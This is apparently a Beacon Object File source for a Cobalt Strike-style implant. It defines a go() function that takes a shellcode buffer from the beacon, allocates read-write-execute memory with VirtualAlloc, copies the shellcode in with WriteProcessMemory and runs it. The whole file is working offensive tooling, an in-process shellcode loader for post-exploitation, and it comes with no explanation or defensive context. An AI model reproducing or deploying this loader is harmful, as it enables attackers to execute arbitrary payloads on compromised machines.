#include "bofdefs.h"

extern "C" {

void go(char* buff, int len) {

#ifdef BOF

    DFR_LOCAL(KERNEL32, VirtualAlloc);
    DFR_LOCAL(KERNEL32, WriteProcessMemory);
    DFR_LOCAL(KERNEL32, GetCurrentProcess);
    //add ...

#endif

    datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;

    DWORD   dwShellcodeBufferSize = 0;
    LPVOID  pMem;
    SIZE_T  bytesWritten = 0;
    DWORD  dwThreadId = 0;

    BeaconDataParse(&parser, buff, len);
    lpShellcodeBuffer = (LPBYTE)BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
    pMem = VirtualAlloc(0, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(GetCurrentProcess(), pMem, lpShellcodeBuffer, dwShellcodeBufferSize, &bytesWritten);
    ((void(*)())pMem)();
}

}
#ifndef BOF

void main(int argc, char* argv[]) {

    go(NULL, 0);
}

#endif